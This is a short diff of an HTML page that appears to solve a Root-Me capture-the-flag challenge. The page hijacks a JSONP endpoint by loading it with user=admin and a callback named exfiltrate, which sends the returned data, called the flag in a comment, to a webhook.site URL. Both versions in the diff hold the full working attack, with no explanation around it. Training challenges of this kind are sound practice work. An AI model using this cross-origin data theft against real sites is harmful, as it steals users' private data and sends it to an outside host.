@@ -1,16 +1,13 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <script>
-      function exfiltrate(data) {
-        // Encodage sécurisé de l’objet reçu
-        const payload = encodeURIComponent(JSON.stringify(data));
-        // Envoie du flag au webhook
-        location.href = "https://webhook.site/04bdcb89-6550-4b5b-a208-513fdbc2e1f2?data=" + payload;
-      }
-    </script>
-  </head>
-  <body>
-    <script src="http://challenge01.root-me.org:58028/page?user=admin&callback=exfiltrate"></script>
-  </body>
+<head>
+  <script>
+    function exfiltrate(data) {
+      location.href = "https://webhook.site/04bdcb89-6550-4b5b-a208-513fdbc2e1f2?" + encodeURIComponent(JSON.stringify(data));
+    }
+  </script>
+</head>
+<body>
+  <script src="http://challenge01.root-me.org:58028/page?user=admin&callback=exfiltrate"></script>
+</body>
 </html>
